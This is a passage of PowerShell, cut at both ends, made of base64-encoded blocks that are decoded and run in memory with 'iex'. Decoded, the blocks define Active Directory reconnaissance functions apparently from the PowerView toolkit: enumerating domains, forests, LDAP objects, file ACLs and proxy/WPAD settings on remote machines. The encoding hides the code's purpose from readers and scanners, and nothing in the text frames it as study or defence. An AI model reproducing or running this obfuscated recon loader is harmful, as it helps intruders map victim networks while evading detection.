JT04iLCAxNjc3NzIxNikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFSVElBTF9TRUNSRVRTX0FDQ09VTlQiLCA2NzEwODg2NCkKICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgICRSZXN1bHRVQUNWYWx1ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgIGlmKCRWYWx1ZSAtaXMgW0ludF0pIHsKICAgICAgICAgICAgJEludFZhbHVlID0gJFZhbHVlCiAgICAgICAgfQogICAgICAgIGlmICgkVmFsdWUgLWlzIFtQU0N1c3RvbU9iamVjdF0pIHsKICAgICAgICAgICAgaWYoJFZhbHVlLnVzZXJhY2NvdW50Y29udHJvbCkgewogICAgICAgICAgICAgICAgJEludFZhbHVlID0gJFZhbHVlLnVzZXJhY2NvdW50Y29udHJvbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmKCRJbnRWYWx1ZSkgewogICAgICAgICAgICBpZigkU2hvd0FsbCkgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJFVBQ1ZhbHVlIGluICRVQUNWYWx1ZXMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgaWYoICgkSW50VmFsdWUgLWJhbmQgJFVBQ1ZhbHVlLlZhbHVlKSAtZXEgJFVBQ1ZhbHVlLlZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRVQUNWYWx1ZXMuQWRkKCRVQUNWYWx1ZS5OYW1lLCAiJCgkVUFDVmFsdWUuVmFsdWUpKyIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0VUFDVmFsdWVzLkFkZCgkVUFDVmFsdWUuTmFtZSwgIiQoJFVBQ1ZhbHVlLlZhbHVlKSIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJFVBQ1ZhbHVlIGluICRVQUNWYWx1ZXMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgaWYoICgkSW50VmFsdWUgLWJhbmQgJFVBQ1ZhbHVlLlZhbHVlKSAtZXEgJFVBQ1ZhbHVlLlZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRVQUNWYWx1ZXMuQWRkKCRVQUNWYWx1ZS5OYW1lLCAiJCgkVUFDVmFsdWUuVmFsdWUpIikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRSZXN1bHRVQUNWYWx1ZXMKICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVByb3h5IHsKICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJEVOVjpDT01QVVRFUk5BTUUKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRSZWcgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5S2V5XTo6T3BlblJlbW90ZUJhc2VLZXkoJ0N1cnJlbnRVc2VyJywgJENvbXB1dGVyTmFtZSkKICAgICAgICAgICAgJFJlZ0tleSA9ICRSZWcuT3BlblN1YmtleSgiU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXEludGVybmV0IFNldHRpbmdzIikKICAgICAgICAgICAgJFByb3h5U2VydmVyID0gJFJlZ0tleS5HZXRWYWx1ZSgnUHJveHlTZXJ2ZXInKQogICAgICAgICAgICAkQXV0b0NvbmZpZ1VSTCA9ICRSZWdLZXkuR2V0VmFsdWUoJ0F1dG9Db25maWdVUkwnKQogICAgICAgICAgICBpZigkQXV0b0NvbmZpZ1VSTCAtYW5kICgkQXV0b0NvbmZpZ1VSTCAtbmUgIiIpKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRXcGFkID0gKE5ldy1PYmplY3QgTmV0LldlYmNsaWVudCkuRG93bmxvYWRTdHJpbmcoJEF1dG9Db25maWdVUkwpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgJFdwYWQgPSAiIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFdwYWQgPSAiIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRQcm94eVNlcnZlciAtb3IgJEF1dG9Db25maWdVcmwpIHsKICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gQHsKICAgICAgICAgICAgICAgICAgICAnUHJveHlTZXJ2ZXInID0gJFByb3h5U2VydmVyCiAgICAgICAgICAgICAgICAgICAgJ0F1dG9Db25maWdVUkwnID0gJEF1dG9Db25maWdVUkwKICAgICAgICAgICAgICAgICAgICAnV3BhZCcgPSAkV3BhZAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRQcm9wZXJ0aWVzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJObyBwcm94eSBzZXR0aW5ncyBmb3VuZCBmb3IgJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIGVudW1lcmF0aW5nIHByb3h5IHNldHRpbmdzIGZvciAkQ29tcHV0ZXJOYW1lIgogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVBhdGhBY2wgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkUGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgZnVuY3Rpb24gQ29udmVydC1GaWxlUmlnaHQgewogICAgICAgICAgICBbQ21kbGV0QmluZGluZygpXQogICAgICAgICAgICBwYXJhbSgKICAgICAgICAgICAgICAgIFtJbnRdCiAgICAgICAgICAgICAgICAkRlNSCiAgICAgICAgICAgICkKICAgICAgICAgICAgJEFjY2Vzc01hc2sgPSBAewogICAgICAgICAgICAgIFt1aW50MzJdJzB4ODAwMDAwMDAnID0gJ0dlbmVyaWNSZWFkJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4NDAwMDAwMDAnID0gJ0dlbmVyaWNXcml0ZScKICAgICAgICAgICAgICBbdWludDMyXScweDIwMDAwMDAwJyA9ICdHZW5lcmljRXhlY3V0ZScKICAgICAgICAgICAgICBbdWludDMyXScweDEwMDAwMDAwJyA9ICdHZW5lcmljQWxsJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMDAwMDAnID0gJ01heGltdW1BbGxvd2VkJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDEwMDAwMDAnID0gJ0FjY2Vzc1N5c3RlbVNlY3VyaXR5JwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAxMDAwMDAnID0gJ1N5bmNocm9uaXplJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwODAwMDAnID0gJ1dyaXRlT3duZXInCiAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDA0MDAwMCcgPSAnV3JpdGVEQUMnCiAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAyMDAwMCcgPSAnUmVhZENvbnRyb2wnCiAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAxMDAwMCcgPSAnRGVsZXRlJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAxMDAnID0gJ1dyaXRlQXR0cmlidXRlcycKICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDgwJyA9ICdSZWFkQXR0cmlidXRlcycKICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDQwJyA9ICdEZWxldGVDaGlsZCcKICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDIwJyA9ICdFeGVjdXRlL1RyYXZlcnNlJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMTAnID0gJ1dyaXRlRXh0ZW5kZWRBdHRyaWJ1dGVzJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDgnID0gJ1JlYWRFeHRlbmRlZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwNCcgPSAnQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnknCiAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMicgPSAnV3JpdGVEYXRhL0FkZEZpbGUnCiAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMScgPSAnUmVhZERhdGEvTGlzdERpcmVjdG9yeScKICAgICAgICAgICAgfQogICAgICAgICAgICAkU2ltcGxlUGVybWlzc2lvbnMgPSBAewogICAgICAgICAgICAgIFt1aW50MzJdJzB4MWYwMWZmJyA9ICdGdWxsQ29udHJvbCcKICAgICAgICAgICAgICBbdWludDMyXScweDAzMDFiZicgPSAnTW9kaWZ5JwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMGE5JyA9ICdSZWFkQW5kRXhlY3V0ZScKICAgICAgICAgICAgICBbdWludDMyXScweDAyMDE5ZicgPSAnUmVhZEFuZFdyaXRlJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMDg5JyA9ICdSZWFkJwogICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMTE2JyA9ICdXcml0ZScKICAgICAgICAgICAgfQogICAgICAgICAgICAkUGVybWlzc2lvbnMgPSBAKCkKICAgICAgICAgICAgJFBlcm1pc3Npb25zICs9ICRTaW1wbGVQZXJtaXNzaW9ucy5LZXlzIHwgICUgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRGU1IgLWJhbmQgJF8pIC1lcSAkXykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaW1wbGVQZXJtaXNzaW9uc1skX10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRlNSID0gJEZTUiAtYmFuZCAoLW5vdCAkXykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAkUGVybWlzc2lvbnMgKz0gJEFjY2Vzc01hc2suS2V5cyB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA/IHsgJEZTUiAtYmFuZCAkXyB9IHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICUgeyAkQWNjZXNzTWFza1skX10gfQogICAgICAgICAgICAoJFBlcm1pc3Npb25zIHwgP3skX30pIC1qb2luICIsIgogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRBQ0wgPSBHZXQtQWNsIC1QYXRoICRQYXRoCiAgICAgICAgICAgICRBQ0wuR2V0QWNjZXNzUnVsZXMoJHRydWUsJHRydWUsW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkTmFtZXMgPSBAKCkKICAgICAgICAgICAgICAgIGlmICgkXy5JZGVudGl0eVJlZmVyZW5jZSAtbWF0Y2ggJ15TLTEtNS0yMS1bMC05XSstWzAtOV0rLVswLTldKy1bMC05XSsnKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1BRE9iamVjdCAtU0lEICRfLklkZW50aXR5UmVmZXJlbmNlCiAgICAgICAgICAgICAgICAgICAgJE5hbWVzID0gQCgpCiAgICAgICAgICAgICAgICAgICAgJFNJRHMgPSBAKCRPYmplY3Qub2JqZWN0c2lkKQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVjdXJzZSAtYW5kICgkT2JqZWN0LnNhbUFjY291bnRUeXBlIC1uZSAiODA1MzA2MzY4IikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNJRHMgKz0gR2V0LU5ldEdyb3VwTWVtYmVyIC1TSUQgJE9iamVjdC5vYmplY3RzaWQgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXJTaWQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJFNJRHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICROYW1lcyArPSAsQCgkXywgKENvbnZlcnQtU2lkVG9OYW1lICRfKSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkTmFtZXMgKz0gLEAoJF8uSWRlbnRpdHlSZWZlcmVuY2UuVmFsdWUsIChDb252ZXJ0LVNpZFRvTmFtZSAkXy5JZGVudGl0eVJlZmVyZW5jZS5WYWx1ZSkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBGb3JFYWNoKCROYW1lIGluICROYW1lcykgewogICAgICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQYXRoJyAkUGF0aAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRmlsZVN5c3RlbVJpZ2h0cycgKENvbnZlcnQtRmlsZVJpZ2h0IC1GU1IgJF8uRmlsZVN5c3RlbVJpZ2h0cy52YWx1ZV9fKQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2UnICROYW1lWzFdCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eVNJRCcgJE5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0FjY2Vzc0NvbnRyb2xUeXBlJyAkXy5BY2Nlc3NDb250cm9sVHlwZQogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJF8KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5hbWVGaWVsZCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgICRPYmplY3QKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRPYmplY3QpIHsKICAgICAgICAgICAgaWYgKCBbYm9vbF0oJE9iamVjdC5QU29iamVjdC5Qcm9wZXJ0aWVzLm5hbWUgLW1hdGNoICJkbnNob3N0bmFtZSIpICkgewogICAgICAgICAgICAgICAgJE9iamVjdC5kbnNob3N0bmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoIFtib29sXSgkT2JqZWN0LlBTb2JqZWN0LlByb3BlcnRpZXMubmFtZSAtbWF0Y2ggIm5hbWUiKSApIHsKICAgICAgICAgICAgICAgICRPYmplY3QubmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJE9iamVjdAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1MREFQUHJvcGVydHkgewogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgJFByb3BlcnRpZXMKICAgICkKICAgICRPYmplY3RQcm9wZXJ0aWVzID0gQHt9CiAgICAkUHJvcGVydGllcy5Qcm9wZXJ0eU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIGlmICgoJF8gLWVxICJvYmplY3RzaWQiKSAtb3IgKCRfIC1lcSAic2lkaGlzdG9yeSIpKSB7CiAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRQcm9wZXJ0aWVzWyRfXVswXSwwKSkuVmFsdWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRfIC1lcSAib2JqZWN0Z3VpZCIpIHsKICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gKE5ldy1PYmplY3QgR3VpZCAoLCRQcm9wZXJ0aWVzWyRfXVswXSkpLkd1aWQKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCAoJF8gLWVxICJsYXN0bG9nb24iKSAtb3IgKCRfIC1lcSAibGFzdGxvZ29udGltZXN0YW1wIikgLW9yICgkXyAtZXEgInB3ZGxhc3RzZXQiKSAtb3IgKCRfIC1lcSAibGFzdGxvZ29mZiIpIC1vciAoJF8gLWVxICJiYWRQYXNzd29yZFRpbWUiKSApIHsKICAgICAgICAgICAgaWYgKCRQcm9wZXJ0aWVzWyRfXVswXSAtaXMgW1N5c3RlbS5NYXJzaGFsQnlSZWZPYmplY3RdKSB7CiAgICAgICAgICAgICAgICAkVGVtcCA9ICRQcm9wZXJ0aWVzWyRfXVswXQogICAgICAgICAgICAgICAgW0ludDMyXSRIaWdoID0gJFRlbXAuR2V0VHlwZSgpLkludm9rZU1lbWJlcigiSGlnaFBhcnQiLCBbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXTo6R2V0UHJvcGVydHksICRudWxsLCAkVGVtcCwgJG51bGwpCiAgICAgICAgICAgICAgICBbSW50MzJdJExvdyAgPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCJMb3dQYXJ0IiwgIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpHZXRQcm9wZXJ0eSwgJG51bGwsICRUZW1wLCAkbnVsbCkKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChbZGF0ZXRpbWVdOjpGcm9tRmlsZVRpbWUoW0ludDY0XSgiMHh7MDp4OH17MTp4OH0iIC1mICRIaWdoLCAkTG93KSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAoW2RhdGV0aW1lXTo6RnJvbUZpbGVUaW1lKCgkUHJvcGVydGllc1skX11bMF0pKSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJFByb3BlcnRpZXNbJF9dWzBdIC1pcyBbU3lzdGVtLk1hcnNoYWxCeVJlZk9iamVjdF0pIHsKICAgICAgICAgICAgJFByb3AgPSAkUHJvcGVydGllc1skX10KICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRUZW1wID0gJFByb3BbJF9dWzBdCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICRfCiAgICAgICAgICAgICAgICBbSW50MzJdJEhpZ2ggPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCJIaWdoUGFydCIsIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpHZXRQcm9wZXJ0eSwgJG51bGwsICRUZW1wLCAkbnVsbCkKICAgICAgICAgICAgICAgIFtJbnQzMl0kTG93ICA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoIkxvd1BhcnQiLCAgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkbnVsbCwgJFRlbXAsICRudWxsKQogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gW0ludDY0XSgiMHh7MDp4OH17MTp4OH0iIC1mICRIaWdoLCAkTG93KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wWyRfXQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZigkUHJvcGVydGllc1skX10uY291bnQgLWVxIDEpIHsKICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX10KICAgICAgICB9CiAgICB9CiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJE9iamVjdFByb3BlcnRpZXMKfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNlYXJjaGVyIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFEU3ByZWZpeCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGlmKCEkRG9tYWluKSB7CiAgICAgICAgJERvbWFpbiA9IChHZXQtTmV0RG9tYWluKS5uYW1lCiAgICB9CiAgICBlbHNlIHsKICAgICAgICBpZighJERvbWFpbkNvbnRyb2xsZXIpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICREb21haW5Db250cm9sbGVyID0gKChHZXQtTmV0RG9tYWluKS5QZGNSb2xlT3duZXIpLk5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICB0aHJvdyAiR2V0LURvbWFpblNlYXJjaGVyOiBFcnJvciBpbiByZXRyaWV2aW5nIFBEQyBmb3IgY3VycmVudCBkb21haW4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAkU2VhcmNoU3RyaW5nID0gIkxEQVA6Ly8iCiAgICBpZigkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJERvbWFpbkNvbnRyb2xsZXIgKyAiLyIKICAgIH0KICAgIGlmKCRBRFNwcmVmaXgpIHsKICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICRBRFNwcmVmaXggKyAiLCIKICAgIH0KICAgIGlmKCRBRFNwYXRoKSB7CiAgICAgICAgaWYoJEFEU3BhdGggLWxpa2UgIkdDOi8vKiIpIHsKICAgICAgICAgICAgJERpc3Rpbmd1aXNoZWROYW1lID0gJEFkc1BhdGgKICAgICAgICAgICAgJFNlYXJjaFN0cmluZyA9ICIiCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZigkQURTcGF0aCAtbGlrZSAiTERBUDovLyoiKSB7CiAgICAgICAgICAgICAgICAkQURTcGF0aCA9ICRBRFNwYXRoLlN1YnN0cmluZyg3KQogICAgICAgICAgICB9CiAgICAgICAgICAgICREaXN0aW5ndWlzaGVkTmFtZSA9ICRBRFNwYXRoCiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgJERpc3Rpbmd1aXNoZWROYW1lID0gIkRDPSQoJERvbWFpbi5SZXBsYWNlKCcuJywgJyxEQz0nKSkiCiAgICB9CiAgICAkU2VhcmNoU3RyaW5nICs9ICREaXN0aW5ndWlzaGVkTmFtZQogICAgV3JpdGUtVmVyYm9zZSAiR2V0LURvbWFpblNlYXJjaGVyIHNlYXJjaCBzdHJpbmc6ICRTZWFyY2hTdHJpbmciCiAgICAkU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcihbQURTSV0kU2VhcmNoU3RyaW5nKQogICAgJFNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAkU2VhcmNoZXIKfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldERvbWFpbiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluCiAgICApCiAgICBwcm9jZXNzIHsKICAgICAgICBpZigkRG9tYWluKSB7CiAgICAgICAgICAgICREb21haW5Db250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0RvbWFpbicsICREb21haW4pCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dOjpHZXREb21haW4oJERvbWFpbkNvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVGhlIHNwZWNpZmllZCBkb21haW4gJERvbWFpbiBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QuIgogICAgICAgICAgICAgICAgJE51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0Q3VycmVudERvbWFpbigpCiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEZvcmVzdCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0CiAgICApCiAgICBwcm9jZXNzIHsKICAgICAgICBpZigkRm9yZXN0KSB7CiAgICAgICAgICAgICRGb3Jlc3RDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0ZvcmVzdCcsICRGb3Jlc3QpCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqZWN0ID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRm9yZXN0XTo6R2V0Rm9yZXN0KCRGb3Jlc3RDb250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLURlYnVnICJUaGUgc3BlY2lmaWVkIGZvcmVzdCAkRm9yZXN0IGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdC4iCiAgICAgICAgICAgICAgICAkTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAg